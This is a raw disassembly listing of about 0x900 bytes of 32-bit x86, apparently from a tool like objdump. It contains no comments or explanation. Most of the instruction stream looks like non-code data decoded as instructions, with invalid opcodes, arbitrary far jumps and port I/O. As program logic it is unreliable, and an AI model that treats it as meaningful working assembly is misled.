  41fcff:	jmp    0x41fd4d
  41fd01:	fs cs push ecx
  41fd04:	and    esp,DWORD PTR [esp+edi*4]
  41fd07:	mov    edi,0xfd766587
  41fd0c:	jge    0x41fd68
  41fd0e:	jno    0x41fcce
  41fd10:	add    BYTE PTR [eax],0x0
	...
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	cdq    
  41fd81:	push   cs
  41fd82:	stos   BYTE PTR es:[edi],al
  41fd83:	jp     0x41fddc
  41fd85:	push   ebx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0x1c000001
  41fd8d:	imul   edi,DWORD PTR [eax-0x71],0x1d258cd1
  41fd94:	mov    dh,bh
  41fd96:	cmp    DWORD PTR cs:[esi],esi
  41fd99:	push   ss
  41fd9a:	adc    DWORD PTR [eax+ebx*4-0x29],0xcfc99893
  41fda2:	fstp   st(1)
  41fda4:	fs ss nop
  41fda7:	adc    al,0x4
  41fda9:	mov    dh,0x0
  41fdab:	inc    esp
  41fdac:	test   DWORD PTR [edx+0xa938df5],edx
  41fdb2:	sub    bh,BYTE PTR [ebx+0x24]
  41fdb5:	retf   
  41fdb6:	cmc    
  41fdb7:	sbb    BYTE PTR [eax-0x48b7be6],ah
  41fdbd:	mov    BYTE PTR [ecx+0x76],ah
  41fdc0:	ret    
  41fdc1:	loop   0x41fdb9
  41fdc3:	cmp    al,al
  41fdc5:	cdq    
  41fdc6:	into   
  41fdc7:	mov    BYTE PTR [esi-0x3ddc9ac1],dl
  41fdcd:	ins    DWORD PTR es:[edi],dx
  41fdce:	pop    ecx
  41fdcf:	lods   al,BYTE PTR ds:[esi]
  41fdd0:	pop    ds
  41fdd1:	xchg   ebp,eax
  41fdd2:	mov    bh,0xc5
  41fdd4:	jl     0x41fd8a
  41fdd6:	jmp    0x3252:0xf40082a5
  41fddd:	xor    eax,0x99aa52f0
  41fde2:	js     0x41fd7e
  41fde4:	push   esi
  41fde5:	outs   dx,BYTE PTR ds:[esi]
  41fde6:	aas    
  41fde7:	js     0x41fdb0
  41fde9:	adc    BYTE PTR [eax+0x58199a33],0x7b
  41fdf0:	ffreep st(1)
  41fdf2:	adc    eax,0xc8935dce
  41fdf7:	test   BYTE PTR [edi-0x5d1472d0],al
  41fdfd:	sbb    eax,0x3c74456
  41fe02:	mov    ch,0xe9
  41fe04:	(bad)  
  41fe06:	lea    edi,[ebx]
  41fe08:	jae    0x41fdf3
  41fe0a:	scas   al,BYTE PTR es:[edi]
  41fe0b:	xor    BYTE PTR [edx+0x69],bh
  41fe0e:	shl    BYTE PTR [ebx],cl
  41fe10:	test   al,0x24
  41fe12:	inc    ecx
  41fe13:	outs   dx,BYTE PTR ds:[esi]
  41fe14:	xor    al,0xee
  41fe16:	cmc    
  41fe17:	enter  0xaafd,0x9
  41fe1b:	inc    ebx
  41fe1c:	mov    ebp,0x32003551
  41fe21:	push   edi
  41fe22:	ds das 
  41fe24:	pop    ss
  41fe25:	xchg   ecx,eax
  41fe26:	mov    bl,0x83
  41fe28:	jmp    0x827c:0x5be16ff0
  41fe2f:	fcmovnb st,st(1)
  41fe31:	fs test al,0x72
  41fe34:	push   esi
  41fe35:	push   ebp
  41fe36:	sub    BYTE PTR [ebx-0x4f],ah
  41fe39:	push   edi
  41fe3a:	mul    BYTE PTR [edi+eiz*8-0x45125dd4]
  41fe41:	push   edx
  41fe42:	sbb    si,bx
  41fe45:	icebp  
  41fe46:	aam    0xff
  41fe48:	stos   BYTE PTR es:[edi],al
  41fe49:	in     eax,dx
  41fe4a:	inc    esi
  41fe4b:	add    dh,dh
  41fe4d:	add    BYTE PTR [ebp-0x12],bh
  41fe50:	or     dl,bh
  41fe52:	adc    DWORD PTR [eax+0x385d898a],eax
  41fe58:	push   eax
  41fe59:	jbe    0x41fe0d
  41fe5b:	fidivr WORD PTR [ebx+0x3d]
  41fe5e:	mov    esi,0xce0ae88d
  41fe63:	xchg   esi,eax
  41fe64:	ffreep st(1)
  41fe66:	dec    edx
  41fe67:	(bad)  
  41fe68:	xchg   esi,eax
  41fe69:	xchg   ebx,eax
  41fe6a:	fbstp  TBYTE PTR [edi-0x3]
  41fe6d:	push   ebx
  41fe6e:	sub    BYTE PTR [esi-0x6f],bh
  41fe71:	(bad)  
  41fe72:	shl    BYTE PTR [esi+0x6d52b310],0x77
  41fe79:	cli    
  41fe7a:	(bad)  
  41fe7b:	in     eax,dx
  41fe7c:	iret   
  41fe7d:	add    al,0x7f
  41fe7f:	div    DWORD PTR [ecx+0x23]
  41fe82:	in     eax,dx
  41fe83:	pop    edx
  41fe84:	cmp    edx,DWORD PTR [ebx+0x2b]
  41fe87:	inc    ebx
  41fe88:	imul   ecx,DWORD PTR [ebx+0x41],0x2ef77bab
  41fe8f:	or     DWORD PTR [eax+eax*1],edi
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x7d
  41ff01:	scas   al,BYTE PTR es:[edi]
  41ff02:	xor    edx,ecx
  41ff04:	pop    esp
  41ff05:	push   esp
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    eax,0xb4000001
  41ff0d:	or     al,ch
  41ff0f:	mov    fs,WORD PTR [esi+0x582c7401]
  41ff15:	stos   BYTE PTR es:[edi],al
  41ff16:	fnstsw WORD PTR [edi]
  41ff18:	int    0xed
  41ff1a:	push   ecx
  41ff1b:	ror    BYTE PTR [esi+0x74631827],1
  41ff21:	mov    BYTE PTR [esi-0x41],ah
  41ff24:	bound  ebx,QWORD PTR [ebx]
  41ff26:	rcr    BYTE PTR [ebx+0x29],1
  41ff29:	mov    esp,0xe36a5647
  41ff2e:	fmul   DWORD PTR [esi-0x3afc9c8c]
  41ff34:	push   ebx
  41ff35:	or     esp,DWORD PTR [ecx]
  41ff37:	sbb    al,0xe5
  41ff39:	das    
  41ff3a:	cs or  eax,0xffffffd6
  41ff3e:	add    DWORD PTR [ebp+ebp*1+0x3856f360],ebp
  41ff45:	dec    edx
  41ff46:	adc    edx,esi
  41ff48:	in     al,0x66
  41ff4a:	sbb    esp,DWORD PTR [ebp+esi*2-0x485f8aeb]
  41ff51:	out    0x19,eax
  41ff53:	or     cl,ch
  41ff55:	jnp    0x41ff16
  41ff57:	push   esi
  41ff58:	jl     0x41ff35
  41ff5a:	js     0x41ff17
  41ff5c:	lods   eax,DWORD PTR ds:[esi]
  41ff5d:	in     al,dx
  41ff5e:	sub    esp,0x6e
  41ff61:	pop    ebx
  41ff62:	add    al,0xef
  41ff64:	sub    BYTE PTR [ebp+0x3f],bl
  41ff67:	jne    0x41ff82
  41ff69:	cdq    
  41ff6a:	mov    ds:0x783d751b,al
  41ff6f:	shl    BYTE PTR ds:0xb27cb7a4,cl
  41ff75:	ins    BYTE PTR es:[edi],dx
  41ff76:	clc    
  41ff77:	xchg   BYTE PTR [edi-0x5027a27b],ah
  41ff7d:	jl     0x41ff39
  41ff7f:	mov    bh,0x0
  41ff81:	mul    DWORD PTR [eax+0x1e]
  41ff84:	(bad)
  41ff8a:	retf   0x1ea
  41ff8d:	inc    eax
  41ff8e:	aam    0x6e
  41ff90:	mov    cl,0x76
  41ff92:	pushf  
  41ff93:	jo     0x420014
  41ff95:	push   esi
  41ff96:	cmp    al,0x22
  41ff98:	or     al,BYTE PTR [esi-0x3bdd0313]
  41ff9e:	rcr    BYTE PTR [ebx+ebp*2],0x6f
  41ffa2:	adc    DWORD PTR [edx-0x1636f2d],edx
  41ffa8:	neg    BYTE PTR [ebx+eiz*8]
  41ffab:	push   edi
  41ffac:	add    ebx,ecx
  41ffae:	mov    eax,ds:0x912f8de0
  41ffb3:	jp     0x42000b
  41ffb5:	dec    esp
  41ffb6:	imul   ebp,DWORD PTR [edi+0x2a6aefc9],0x94e5698d
  41ffc0:	xchg   esi,eax
  41ffc1:	xor    DWORD PTR [edi+0x6ac80d35],ebx
  41ffc7:	xor    DWORD PTR [edx+0x3d],0x5f
  41ffcb:	xor    dh,BYTE PTR [ecx+0x6d]
  41ffce:	cwde   
  41ffcf:	call   0x20ad8448
  41ffd4:	outs   dx,DWORD PTR ds:[esi]
  41ffd5:	repz cmp dl,ch
  41ffd8:	sub    ah,dl
  41ffda:	loopne 0x41ff91
  41ffdc:	dec    esp
  41ffdd:	pop    esi
  41ffde:	cmp    edx,eax
  41ffe0:	js     0x41ffbb
  41ffe2:	aam    0x6d
  41ffe4:	mov    ah,0x99
  41ffe6:	pop    ebp
  41ffe7:	pushf  
  41ffe8:	fcomp  DWORD PTR cs:[ecx+0x669cae6b]
  41ffef:	mov    eax,ds:0x3535e128
  41fff4:	fs scas eax,DWORD PTR es:[edi]
  41fff6:	add    DWORD PTR [eax+0x3a355f99],esp
  41fffc:	jae    0x420048
  41fffe:	inc    edi
  41ffff:	test   edi,edx
  420001:	leave  
  420002:	jl     0x41ffba
  420004:	rol    ah,1
  420006:	dec    ebp
  420007:	mov    ds:0x6e5ce741,eax
  42000c:	call   0x0:0xf7eda92c
	...
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffed
  420081:	mov    cl,al
  420083:	jns    0x4200e6
  420085:	push   ebp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x39000001
  42008d:	pusha  
  42008e:	cmp    ebp,ebx
  420090:	mov    edi,DWORD PTR [edx-0x28a3504d]
  420096:	mov    esp,0x8bdfc0c9
  42009b:	push   cs
  42009c:	or     al,0xce
  42009e:	aam    0x68
  4200a0:	mov    al,0x9d
  4200a2:	xchg   edi,eax
  4200a3:	sbb    ecx,DWORD PTR [ebx+ebx*1-0x5a]
  4200a7:	das    
  4200a8:	adc    ecx,DWORD PTR [edi+0xa47155f]
  4200ae:	dec    esi
  4200af:	or     eax,edi
  4200b1:	retf   
  4200b2:	int3   
  4200b3:	ins    DWORD PTR es:[edi],dx
  4200b4:	pushf  
  4200b5:	xor    edi,DWORD PTR [ecx-0x54]
  4200b8:	xor    BYTE PTR [edx+eax*2],dl
  4200bb:	jge    0x4200fd
  4200bd:	pop    ds
  4200be:	push   ecx
  4200bf:	pop    eax
  4200c0:	jg     0x42006c
  4200c2:	pop    ds
  4200c3:	int    0x46
  4200c5:	push   ebp
  4200c6:	icebp  
  4200c7:	sub    bh,BYTE PTR [esi+ebp*4-0x2e]
  4200cb:	cdq    
  4200cc:	arpl   WORD PTR [ecx+0x63],di
  4200cf:	lock jb 0x4200d2
  4200d2:	leave  
  4200d3:	pop    ss
  4200d4:	js     0x420152
  4200d6:	lds    ebx,FWORD PTR [eax]
  4200d8:	daa    
  4200d9:	(bad)  
  4200da:	fiadd  DWORD PTR [esi]
  4200dc:	and    DWORD PTR [eax],edi
  4200de:	add    eax,0xe9b2669d
  4200e3:	jge    0x420152
  4200e5:	repz div BYTE PTR [ecx+0x584b5486]
  4200ec:	fimul  WORD PTR [eax]
  4200ee:	inc    esp
  4200ef:	or     ebx,esi
  4200f1:	dec    ecx
  4200f2:	lock jmp 0xbbef:0xde83fd05
  4200fa:	int    0xb6
  4200fc:	lods   eax,DWORD PTR cs:[esi]
  4200fe:	pop    ebx
  4200ff:	push   edi
  420100:	and    al,0x77
  420102:	mov    eax,0x664cd35d
  420107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420108:	xor    DWORD PTR [edi+0x209b5583],edx
  42010e:	mul    BYTE PTR [eax+0x504f0c2b]
  420114:	mov    ?,WORD PTR ds:0xe7ad0038
  42011a:	add    DWORD PTR [edi],ebp
  42011c:	and    ebx,esi
  42011e:	scas   al,BYTE PTR es:[edi]
  42011f:	out    0x70,eax
  420121:	push   ebp
  420122:	out    0x1c,eax
  420124:	loope  0x4200fb
  420126:	je     0x420101
  420128:	ret    0x736
  42012b:	sub    ecx,DWORD PTR [esp+ebp*4-0x5a21b334]
  420132:	(bad)  
  420133:	mov    bh,BYTE PTR [edx-0x406001c4]
  420139:	mov    ds:0x22fcc936,eax
  42013e:	push   es
  42013f:	bound  ebp,QWORD PTR [eax-0x4919464b]
  420145:	dec    esp
  420146:	jnp    0x42019b
  420148:	bound  esp,QWORD PTR [edi+0x2c3aa9d6]
  42014e:	cmp    eax,0x71bb10c
  420153:	call   0xfdd3:0x46d4641c
  42015a:	sub    al,BYTE PTR [esp+edi*1+0x70dbd70c]
  420161:	daa    
  420162:	mov    dl,0x9a
  420164:	verw   WORD PTR [esi+0x2e67246]
  42016b:	imul   esi,DWORD PTR [edi+0x6f],0x9
  42016f:	pop    eax
  420170:	xchg   edx,eax
  420171:	xchg   ebp,eax
  420172:	mov    edx,0xae3bc345
  420177:	fimul  DWORD PTR [ebx+ebp*1-0x1108ca78]
  42017e:	and    al,BYTE PTR [ebx]
  420180:	mov    ecx,esp
  420182:	jae    0x420106
  420184:	sub    eax,0xb835b17c
  420189:	ficomp WORD PTR [ecx]
  42018b:	ror    BYTE PTR [edx+0x71869675],0x0
	...
  4201f2:	add    BYTE PTR [eax],al
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x4efd625c],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0x23000001
  42020d:	mov    dh,0x9f
  42020f:	sbb    al,0x87
  420211:	pop    eax
  420212:	jp     0x4201af
  420214:	outs   dx,BYTE PTR ds:[esi]
  420215:	nop
  420216:	push   cs
  420217:	repnz add eax,0x66712e28
  42021d:	adc    DWORD PTR fs:[ecx],ebp
  420220:	pop    ds
  420221:	imul   ebp,DWORD PTR [eax-0x74],0x2f0b99c6
  420228:	sub    DWORD PTR [esi+0x65],edx
  42022b:	xor    ebp,edi
  42022d:	and    eax,DWORD PTR [edx-0x281a02ad]
  420233:	jne    0x42027c
  420235:	out    0xbb,al
  420237:	(bad)  [edi-0x5246961e]
  42023d:	dec    esi
  42023e:	or     bh,bh
  420240:	lds    esi,FWORD PTR [edx]
  420242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420243:	xacquire xchg DWORD PTR [edi+0x9],edi
  420247:	neg    DWORD PTR [ebx-0x44c60e02]
  42024d:	push   esp
  42024e:	sub    BYTE PTR [eax+0x43b703e],ch
  420254:	and    DWORD PTR [edx+0x15],eax
  420257:	push   ebp
  420258:	fwait
  420259:	sahf   
  42025a:	push   esp
  42025b:	or     eax,0xf1ba26ba
  420260:	hlt    
  420261:	adc    BYTE PTR [esi],dh
  420263:	jle    0x42028c
  420265:	pop    ss
  420266:	dec    edi
  420267:	cmp    eax,0x1036471b
  42026c:	jle    0x4202d8
  42026e:	je     0x420259
  420270:	xchg   edx,eax
  420271:	jle    0x4202d1
  420273:	dec    esi
  420274:	imul   esi,DWORD PTR [edi],0x9ce26585
  42027a:	pop    eax
  42027b:	jecxz  0x4202a2
  42027d:	dec    esp
  42027e:	scas   al,BYTE PTR es:[edi]
  42027f:	in     eax,0x71
  420281:	xchg   edx,eax
  420282:	and    BYTE PTR [edi-0xe193ae0],ch
  420288:	jmp    0x420233
  42028a:	cmp    DWORD PTR [ebx+0x66],ecx
  42028d:	out    0x3,al
  42028f:	das    
  420290:	lds    esi,FWORD PTR [edx+0x2f]
  420293:	(bad)  
  420294:	jp     0x4202e7
  420296:	xchg   edi,eax
  420297:	mov    al,0x1b
  420299:	ds (bad) 
  42029b:	and    DWORD PTR [ebx+ecx*4-0x2cba58b4],esp
  4202a2:	sub    BYTE PTR [ecx],ah
  4202a4:	and    bh,BYTE PTR [ecx+eiz*1-0x16]
  4202a8:	mov    WORD PTR [esi+0x5c],fs
  4202ab:	xchg   edx,eax
  4202ac:	je     0x42029e
  4202ae:	mov    dl,0x67
  4202b0:	pop    esi
  4202b1:	dec    edi
  4202b2:	push   ebx
  4202b3:	and    ebx,DWORD PTR ds:0x4578c029
  4202b9:	push   esi
  4202ba:	xor    BYTE PTR [edx+0x45],dh
  4202bd:	mov    eax,ds:0xa774924c
  4202c2:	and    ah,BYTE PTR [esp+edi*4]
  4202c5:	popa   
  4202c6:	arpl   WORD PTR [ecx-0x5cefabf3],cx
  4202cc:	fild   DWORD PTR [ecx]
  4202ce:	push   DWORD PTR [ecx+0x34ff7ea3]
  4202d4:	cdq    
  4202d5:	mov    ds:0x133d8282,al
  4202da:	int    0x65
  4202dc:	pextrw edi,(bad),0xc5
  4202de:	cmp    eax,0x942655be
  4202e3:	dec    edx
  4202e4:	sbb    DWORD PTR [eax-0x3d],ecx
  4202e7:	jbe    0x420275
  4202e9:	mov    bh,0x5a
  4202eb:	xchg   esp,ecx
  4202ed:	loop   0x420272
  4202ef:	adc    eax,0x919418bd
  4202f4:	test   al,0xe5
  4202f6:	adc    bh,cl
  4202f8:	out    0x37,al
  4202fa:	cdq    
  4202fb:	std    
  4202fc:	mov    ds:0xc9e5af8c,al
  420301:	fs (bad) 
  420303:	sbb    BYTE PTR [ebx+0x5c086c81],dh
  420309:	in     eax,dx
  42030a:	jmp    0xab7d:0x433e4991
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	xor    ch,BYTE PTR [edx+0x4e]
  420383:	dec    edi
  420384:	imul   edx,DWORD PTR [edi+0x1],0x0
  420388:	add    eax,0xb6000001
  42038d:	icebp  
  42038e:	mov    edx,0x127887b3
  420393:	xchg   DWORD PTR [eax-0xb],edx
  420396:	sar    BYTE PTR [eax-0x2a184b0c],1
  42039c:	cmp    ecx,DWORD PTR [edx]
  42039e:	push   0x5c
  4203a0:	ret    
  4203a1:	add    DWORD PTR [edi+0x35],esp
  4203a4:	ss mov cl,0x57
  4203a7:	js     0x420390
  4203a9:	test   BYTE PTR [edx-0x71998a34],al
  4203af:	xchg   esp,eax
  4203b0:	shl    DWORD PTR [esi],0x7f
  4203b3:	dec    esp
  4203b4:	mov    bh,0x86
  4203b6:	aaa    
  4203b7:	and    DWORD PTR [ebp+eiz*2+0x6dc0d268],ebp
  4203be:	jne    0x4203e2
  4203c0:	push   ds
  4203c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203c2:	xor    dh,al
  4203c4:	xchg   esp,eax
  4203c5:	cli    
  4203c6:	mov    eax,ds:0x3589eb24
  4203cb:	dec    edi
  4203cc:	(bad)  
  4203cd:	jo     0x4203cc
  4203cf:	xchg   ebx,eax
  4203d0:	add    dl,ch
  4203d2:	pop    ds
  4203d3:	ds mov cl,0x37
  4203d6:	retf   
  4203d7:	pop    edx
  4203d8:	sbb    cl,al
  4203da:	pop    esi
  4203db:	fld    QWORD PTR [edi-0x66]
  4203de:	icebp  
  4203df:	mov    edx,0xd7b23661
  4203e4:	and    al,0x90
  4203e6:	xor    BYTE PTR [eax+0x482d65ee],0xcd
  4203ed:	mov    ?,WORD PTR [edx-0x6e]
  4203f0:	(bad)  
  4203f1:	jp     0x4203d5
  4203f3:	push   0x1d
  4203f5:	pop    esi
  4203f6:	leave  
  4203f7:	hlt    
  4203f8:	(bad)  
  4203f9:	cld    
  4203fa:	cmp    esi,0x9cf5731f
  420400:	adc    cl,BYTE PTR [edx+0x46fb9ad9]
  420406:	sub    eax,0x9bbb67ce
  42040b:	cmp    ecx,DWORD PTR [eax+0xc]
  42040e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42040f:	xor    edi,DWORD PTR [ecx]
  420411:	pop    esi
  420412:	popa   
  420413:	mov    BYTE PTR [esp+edi*2+0x1f],dl
  420417:	inc    eax
  420418:	(bad)
  42041c:	lock sub BYTE PTR [ecx+0x9b91768],0xce
  420424:	enter  0x7798,0x49
  420428:	mov    BYTE PTR [edx+eiz*8-0xaed6b78],dh
  42042f:	popa   
  420430:	pop    DWORD PTR [ebp+0x71fd34a3]
  420436:	sbb    BYTE PTR [eax],dh
  420438:	repnz mov BYTE PTR [eax+0x75],0x35
  42043d:	or     eax,0xcb309463
  420442:	sbb    DWORD PTR [ebp+0x3c6cf8ff],ecx
  420448:	stc    
  420449:	jnp    0x420461
  42044b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42044c:	inc    ebx
  42044d:	aas    
  42044e:	js     0x420429
  420450:	call   0xadc0:0x386fd650
  420457:	das    
  420458:	jo     0x42049b
  42045a:	arpl   WORD PTR [eax],si
  42045c:	or     esi,0xa6113a20
  420462:	jae    0x420491
  420464:	sub    DWORD PTR [edx+edi*1],edi
  420467:	dec    ebp
  420468:	popa   
  420469:	inc    eax
  42046a:	lods   al,BYTE PTR ds:[esi]
  42046b:	std    
  42046c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42046d:	gs icebp 
  42046f:	out    dx,eax
  420470:	mov    bl,0x7e
  420472:	or     ch,cl
  420474:	sahf   
  420475:	icebp  
  420476:	call   0xcbd4:0x2c36b18a
  42047d:	inc    ecx
  42047e:	lds    edi,FWORD PTR [ebx]
  420480:	aas    
  420481:	and    al,0x5
  420483:	add    cl,ch
  420485:	jmp    0xdba:0xc17cd5d0
  42048c:	iret   
  42048d:	xchg   edi,eax
  42048e:	xor    eax,0x887a
	...
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	fucompp 
  420502:	(bad)  
  420503:	mov    edi,0x15870
  420508:	add    eax,0x18000001
  42050d:	loope  0x420515
  42050f:	frstor [ebx+0x18116a6a]
  420515:	sub    al,0x36
  420517:	adc    bl,BYTE PTR [edx]
  420519:	cmp    al,0x3f
  42051b:	xchg   ebp,eax
  42051c:	mov    edi,0xee79f679
  420521:	mov    edi,0x798deb93
  420526:	sbb    ebp,ebx
  420528:	pop    eax
  420529:	outs   dx,BYTE PTR ds:[esi]
  42052a:	dec    ebp
  42052b:	out    0x15,al
  42052d:	int3   
  42052e:	cmp    eax,0x16a4665a
  420533:	jae    0x42050c
  420535:	sub    bh,cl
  420537:	push   ebp
  420538:	dec    esi
  420539:	inc    esi
  42053a:	aas    
  42053b:	jmp    0x6603:0xe373fa43
  420542:	dec    eax
  420543:	xchg   ebx,eax
  420544:	and    BYTE PTR [esi-0x7b1aa089],0xcf
  42054b:	add    bh,dl
  42054d:	ds addr16 in eax,dx
  420550:	jge    0x420562
  420552:	ja     0x42051c
  420554:	mov    edx,edx
  420556:	lods   al,BYTE PTR ds:[esi]
  420557:	js     0x4205d7
  420559:	rcr    BYTE PTR [ecx],1
  42055b:	mov    cs,WORD PTR [edx+0x7a391c94]
  420561:	and    ecx,DWORD PTR [ecx-0x4fd5b573]
  420567:	aas    
  420568:	sub    al,0x58
  42056a:	mov    WORD PTR [edx],es
  42056c:	mov    WORD PTR [ecx+0x4a6f48a7],ds
  420572:	mov    edx,0xd1fd7ffb
  420577:	out    0xb4,al
  420579:	jle    0x420574
  42057b:	pop    es
  42057c:	xchg   BYTE PTR [eax-0x29],dl
  42057f:	test   dh,0x7
  420582:	ret    0x841f
  420585:	pop    edx
  420586:	test   DWORD PTR [edx+ebp*4-0x39],eax
  42058a:	jle    0x4205b8
  42058c:	sbb    cl,dl
  42058e:	sbb    al,0x51
  420590:	inc    eax
  420591:	jl     0x420602
  420593:	inc    ebp
  420594:	mov    eax,0xef12917d
  420599:	test   eax,0x5f7c866d
  42059e:	pusha  
  42059f:	dec    edx
  4205a0:	loope  0x4205fe
  4205a2:	cmp    al,0x27
  4205a4:	bound  ebp,QWORD PTR ds:0x7463d2d7
  4205aa:	fmul   QWORD PTR [ebx+0xb]
  4205ad:	add    ch,ah
  4205af:	dec    eax
  4205b0:	outs   dx,BYTE PTR ds:[esi]
  4205b1:	cmp    dh,BYTE PTR [esi-0x6b]
  4205b4:	enter  0x9ceb,0xbb
  4205b8:	outs   dx,BYTE PTR ds:[esi]
  4205b9:	sub    DWORD PTR [edx],edi
  4205bb:	pop    es
  4205bc:	push   es
  4205bd:	adc    edx,DWORD PTR [ecx+eiz*4-0x4a]
  4205c1:	shl    BYTE PTR [ebx+0x25d2d616],cl
  4205c7:	das    
  4205c8:	pop    ecx
  4205c9:	jecxz  0x420610
  4205cb:	and    eax,0x91f17629
  4205d0:	or     DWORD PTR [ebx],edi
  4205d2:	sbb    BYTE PTR [eax+0x2d],dl
  4205d5:	pop    edi
  4205d6:	xchg   edx,eax
  4205d7:	pop    ds
  4205d8:	fstp   st(2)
  4205da:	shr    BYTE PTR [ebp-0x7dd8ea17],0x2
  4205e1:	dec    ebp
  4205e2:	inc    ebp
  4205e3:	popf   
  4205e4:	adc    eax,DWORD PTR [edx]
  4205e6:	xor    BYTE PTR [esi+0xc93b681],0xd7
  4205ed:	in     eax,0x88
  4205ef:	ss push esp
  4205f1:	ins    BYTE PTR es:[di],dx
  4205f3:	mov    esp,0x234e0224
  4205f8:	retf   0xb66d
  4205fb:	stos   BYTE PTR es:[edi],al
  4205fc:	retf   0x8d49
  4205ff:	retf   
  420600:	bnd jne 0x420630
  420603:	xchg   ah,dl
  420605:	shr    edx,0xcc
  420608:	xchg   ecx,eax
  420609:	and    BYTE PTR [ebx],dl
  42060b:	fidivr WORD PTR ds:0xe85338d1
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	cli    
  420681:	xchg   DWORD PTR [edx+0x15975af],eax
  420687:	add    BYTE PTR ds:0xdb000001,al
  42068d:	xor    ebx,DWORD PTR [esi-0x5dfcaf43]
  420693:	in     al,dx
  420694:	push   ds
  420695:	addr16 aaa 
  420697:	mov    bh,0xe7
  420699:	mov    al,0xd8
  42069b:	sub    dh,ch
  42069d:	mov    BYTE PTR [ebx+ebp*4-0x24376209],dh
  4206a4:	dec    esp
  4206a5:	ins    BYTE PTR es:[edi],dx
  4206a6:	pop    edi
  4206a7:	jb     0x4206e7
  4206a9:	popa   
  4206aa:	mov    ebp,0x4fb3f0bc
  4206af:	in     al,dx
  4206b0:	cld    
  4206b1:	push   eax
  4206b2:	cmp    al,0x8
  4206b4:	shl    DWORD PTR [ebx-0x6e],0x30
  4206b8:	jge    0x42071f
  4206ba:	and    BYTE PTR [ebx+0x79],bl
  4206bd:	xor    cl,BYTE PTR [edx+ebp*1+0x629fb233]
  4206c4:	in     al,dx
  4206c5:	loopne 0x42069c
  4206c7:	jge    0x420652
  4206c9:	mov    esi,0xf7c9224b
  4206ce:	jmp    0x420660
  4206d0:	scas   al,BYTE PTR es:[edi]
  4206d1:	and    al,0x11
  4206d3:	xchg   esp,eax
  4206d4:	cmp    bh,dl
  4206d6:	outs   dx,BYTE PTR ds:[esi]
  4206d7:	imul   ecx,DWORD PTR [esi-0x63],0x1027879f
  4206de:	or     dh,BYTE PTR ds:0x99badc15
  4206e4:	pop    ecx
  4206e5:	fmul   st,st(1)
  4206e7:	push   0xa27537ec
  4206ec:	push   eax
  4206ed:	mov    ebx,DWORD PTR [ecx+edi*8+0x39]
  4206f1:	push   es
  4206f2:	pusha  
  4206f3:	sbb    ecx,DWORD PTR [esi-0x1bb62b74]
  4206f9:	iret   
  4206fa:	xor    BYTE PTR [ecx],ah
  4206fc:	jno    0x42075a
  4206fe:	lock cmp ecx,DWORD PTR [edi+0x780d761c]
  420705:	xchg   ebx,eax
  420706:	(bad)  
  420707:	into   
  420708:	scas   eax,DWORD PTR es:[edi]
  420709:	mov    cl,0x1e
  42070b:	jnp    0x4206a2
  42070d:	xchg   edx,eax
  42070e:	mov    eax,0x25ead96b
  420713:	cmp    bl,ch
  420715:	in     al,0x18
  420717:	or     ebx,esp
  420719:	mov    bh,0x99
  42071b:	(bad)  
  42071c:	push   0xffffff89
  42071e:	test   DWORD PTR [ebp+0x792d6aad],edi
  420724:	mov    dh,0x93
  420726:	mov    al,ds:0x7641d6d4
  42072b:	xor    al,0x20
  42072d:	dec    ebx
  42072e:	mov    ecx,0x1874a7f2
  420733:	mov    ebp,0x86a3d4ae
  420738:	mov    ebx,0x261cef4d
  42073d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42073e:	or     BYTE PTR [esi+0x378d3be0],bh
  420744:	cs ins DWORD PTR es:[edi],dx
  420746:	aas    
  420747:	loope  0x420768
  420749:	(bad)  
  42074a:	push   edi
  42074b:	sub    ebx,DWORD PTR [edx+0x29]
  42074e:	test   ecx,0x1aa90dde
  420754:	ror    ah,1
  420756:	leave  
  420757:	push   es
  420758:	imul   ebx,DWORD PTR [eax],0xffffffa8
  42075b:	fadd   DWORD PTR [esi+ebp*8]
  42075e:	fimul  DWORD PTR [ecx]
  420760:	pop    ecx
  420761:	jb     0x420728
  420763:	cmp    al,0x90
  420765:	jl     0x420701
  420767:	xor    eax,0xf915aade
  42076c:	call   0xf086:0xd2dbbdfa
  420773:	sbb    BYTE PTR [edi-0x17270aa6],bl
  420779:	xchg   DWORD PTR [edi-0x2b1b24b8],edi
  42077f:	jg     0x4207c6
  420781:	push   0xa8777184
  420786:	mov    ah,0x11
  420788:	dec    ebp
  420789:	or     DWORD PTR ds:0xe9f2cacc,ebx
  42078f:	fisttp QWORD PTR [edi+0x0]
	...
